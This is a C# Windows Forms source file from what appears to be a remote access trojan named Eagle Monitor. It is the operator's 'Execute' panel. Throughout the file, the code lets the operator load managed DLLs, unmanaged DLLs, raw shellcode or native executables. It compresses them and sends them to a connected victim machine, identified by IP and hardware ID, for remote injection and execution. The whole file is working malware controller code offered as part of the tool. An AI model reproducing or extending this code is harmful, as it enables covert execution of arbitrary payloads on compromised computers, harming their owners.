using Eagle_Monitor.Clients;
using Eagle_Monitor.Controls;
using Microsoft.VisualBasic;
using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Forms
{
    public partial class ExecuteForm : FormPattern
    {
        public string ClientHWID { get; set; }
        public string IP_Origin { get; set; }

        public ExecuteForm(string ClientHWID, string IP_Origin)
        {
            this.ClientHWID = ClientHWID;
            this.IP_Origin = IP_Origin;
            InitializeComponent();
        }

        private void ExecuteDllForm_Load(object sender, EventArgs e)
        {
            foreach (ToolStripMenuItem I in managedContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            managedContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

            foreach (ToolStripMenuItem I in unmanagedContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            unmanagedContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

            foreach (ToolStripMenuItem I in shellCodeContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            shellCodeContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

            foreach (ToolStripMenuItem I in nativePEContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            nativePEContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem I = new ListViewItem();

            using (OpenFileDialog o = new OpenFileDialog())
            {
                o.DefaultExt = ".dll";
                if (o.ShowDialog() == DialogResult.OK)
                {
                    I.Text = o.FileName;
                    string S = Interaction.InputBox("Insert the entrypoint of your dll : [Namespace.Class.Function]");
                    I.SubItems.Add(S);
                    I.SubItems.Add(Utilities.Numeric2Bytes(new FileInfo(o.FileName).Length));
                    managedListView.Items.Add(I);
                }
            }
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (managedListView.SelectedItems.Count == 1)
            {
                managedListView.SelectedItems[0].Remove();
            }
        }

        private void injectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (managedListView.SelectedItems.Count == 1) 
            {
                byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(managedListView.SelectedItems[0].Text), 1);
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.Execute;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.EXEC_MANAGED_DLL, b , managedListView.SelectedItems[0].SubItems[1].Text , Utilities.SplitPath(managedListView.SelectedItems[0].Text) };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void addToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem I = new ListViewItem();

            using (OpenFileDialog o = new OpenFileDialog())
            {
                o.DefaultExt = ".dll";
                if (o.ShowDialog() == DialogResult.OK)
                {
                    I.Text = o.FileName;
                    I.SubItems.Add(Utilities.Numeric2Bytes(new FileInfo(o.FileName).Length));
                    unmanagedListView.Items.Add(I);
                }
            }
        }

        private void removeToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (unmanagedListView.SelectedItems.Count == 1)
            {
                unmanagedListView.SelectedItems[0].Remove();
            }
        }

        private void injectToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (unmanagedListView.SelectedItems.Count == 1)
            {
                byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(unmanagedListView.SelectedItems[0].Text), 1);
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.Execute;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.EXEC_NATIVE_DLL, b, Utilities.SplitPath(unmanagedListView.SelectedItems[0].Text) };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem I = new ListViewItem();

            using (OpenFileDialog o = new OpenFileDialog())
            {
                o.DefaultExt = ".dll";
                if (o.ShowDialog() == DialogResult.OK)
                {
                    I.Text = o.FileName;
                    I.SubItems.Add(Utilities.Numeric2Bytes(new FileInfo(o.FileName).Length));
                    shellCodeListView.Items.Add(I);
                }
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (shellCodeListView.SelectedItems.Count == 1)
            {
                shellCodeListView.SelectedItems[0].Remove();
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (shellCodeListView.SelectedItems.Count == 1)
            {
                byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(shellCodeListView.SelectedItems[0].Text), 1);
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.Execute;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.EXEC_SHELL_CODE, b, Utilities.SplitPath(shellCodeListView.SelectedItems[0].Text) };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            ListViewItem I = new ListViewItem();

            using (OpenFileDialog o = new OpenFileDialog())
            {
                o.DefaultExt = ".dll";
                if (o.ShowDialog() == DialogResult.OK)
                {
                    I.Text = o.FileName;
                    I.SubItems.Add(Utilities.Numeric2Bytes(new FileInfo(o.FileName).Length));
                    nativePEListView.Items.Add(I);
                }
            }
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (nativePEListView.SelectedItems.Count == 1)
            {
                nativePEListView.SelectedItems[0].Remove();
            }
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            if (nativePEListView.SelectedItems.Count == 1)
            {
                byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(nativePEListView.SelectedItems[0].Text), 1);
                Client C = Client.ClientDictionary[this.IP_Origin];
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.Execute;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketType.EXEC_NATIVE_EXE, b, Utilities.SplitPath(nativePEListView.SelectedItems[0].Text) };
                Task.Run(() => C.SendData(D.Serialize()));
            }
        }
    }
}
